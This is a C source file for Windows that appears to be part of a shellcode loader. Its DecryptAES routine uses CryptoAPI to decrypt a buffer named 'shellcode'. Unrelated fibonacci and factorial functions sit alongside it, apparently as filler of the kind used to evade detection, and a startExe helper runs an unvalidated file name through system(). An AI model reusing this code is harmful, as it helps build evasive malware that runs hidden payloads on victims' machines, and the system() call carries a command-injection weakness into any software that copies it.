#include "aes2_converter.h"
 
#pragma comment (lib, "crypt32.lib")

// #pragma comment(lib, "ntdll")

void DecryptAES(char* shellcode, DWORD shellcodeLen, unsigned char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

long long int fibonacci(int n) {
    if (n <= 1) {
        return n;
    } else {
        return fibonacci(n-1) + fibonacci(n-2);
    }
}

void printFactorial(unsigned int n) {
    unsigned long long fact = 1; // Initialize factorial result
    for (unsigned int i = 1; i <= n; ++i) {
        fact *= i;
    }
    printf("Factorial of %u is %llu\n", n, fact);
}


void startExe(const char* exeName) {
    char command[256];
    
    // Ensure the command string to execute is properly formatted and enclosed in quotes to handle spaces in paths
    snprintf(command, sizeof(command), ".\\\"%s\"", exeName);

    int result = system(command);
    if (result != 0) {
        printf("Execution failed with return code: %d\n", result);
    }
}